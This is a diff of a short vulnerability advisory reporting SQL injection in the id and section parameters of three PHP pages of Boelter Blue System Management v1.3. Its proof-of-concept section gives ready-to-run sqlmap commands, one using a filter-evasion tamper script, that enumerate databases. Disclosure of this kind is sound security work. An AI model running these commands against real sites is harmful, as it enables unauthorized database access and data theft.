@@ -15,25 +15,26 @@
 Boelter Blue System Management v1.3 has been found to contain multiple critical SQL injection vulnerabilities. These vulnerabilities allow attackers to execute arbitrary SQL queries, potentially leading to sensitive data exposure, unauthorized access, and complete control over the affected database.
 
 ## Affected Component##
-> news_details.php
-> services.php
+> news_details.php  
+> services.php  
 > location_details.php
 
 >  - id parameter
 >  - section parameter
 
+  
 #### PoC Example
-**SQLMap Injection**: 
+**SQLMap Injection**:   
 `sqlmap -u "https://www.example.com/news_details.php?id=10071" --random-agent --dbms=mysql --dbs`
 
 
-**news_details.php?id** parameter:
+**news_details.php?id** parameter:  
    `sqlmap -u "https://www.example.com/news_details.php?id=10071" --random-agent --dbms=mysql --threads=4 --dbs`
    
-**services.php?section** parameter:
+**services.php?section** parameter:  
    `sqlmap -u "https://www.example.com/services.php?section=5081" --random-agent --tamper=space2comment --threads=8 --dbs`
    
-**location_details.php?id** parameter:
+**location_details.php?id** parameter:  
    `sqlmap -u "https://www.example.com/location_details.php?id=836" --random-agent --dbms=mysql --dbs`
 
 
